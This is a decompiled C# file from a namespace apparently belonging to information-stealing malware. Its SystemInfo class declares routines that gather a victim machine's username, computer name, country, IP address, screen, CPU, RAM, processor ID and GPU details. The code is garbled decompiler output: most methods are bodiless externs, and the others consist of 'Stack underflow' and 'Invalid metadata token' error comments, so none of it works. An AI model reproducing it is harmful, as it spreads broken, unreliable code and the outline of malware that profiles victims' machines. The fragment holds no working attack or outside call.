namespace youknowcaliber;

internal class SystemInfo
{
	public static string username;

	public static string compname;

	public static extern void GetSystem();

	public static extern string GetSystemVersion();

	public static string GetWindowsVersionName()
	{
		checked
		{
			while (true)
			{
				if (/*Error near IL_0005: Stack underflow*/ <= /*Error near IL_0005: Stack underflow*/)
				{
					_ = (ushort)/*Error near IL_0006: Stack underflow*/;
					/*Error near IL_0007: starg 0 (out-of-bounds)*/;
					if (/*Error near IL_000e: Stack underflow*/ <= /*Error near IL_000e: Stack underflow*/)
					{
						break;
					}
				}
			}
			return (string)/*Error near IL_000f: Stack underflow*/;
		}
	}

	private static string GetBitVersion()
	{
		//Discarded unreachable code: IL_0005, IL_0013, IL_001e, IL_0023, IL_002a
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	public static extern string CountryCode();

	public static extern string Country();

	public static extern string IP();

	public static extern string ScreenMetrics();

	public static extern string GetCPUName();

	public static extern string GetRAM();

	public static extern string GetProcessorID();

	public static string GetGpuName()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		nint num = checked((nint)/*Error near IL_0001: Stack underflow*/);
		_ = /*Error near IL_0002: Stack underflow*// num;
		/*Error: Unexpected end of block*/;
	}

	public extern SystemInfo();
}
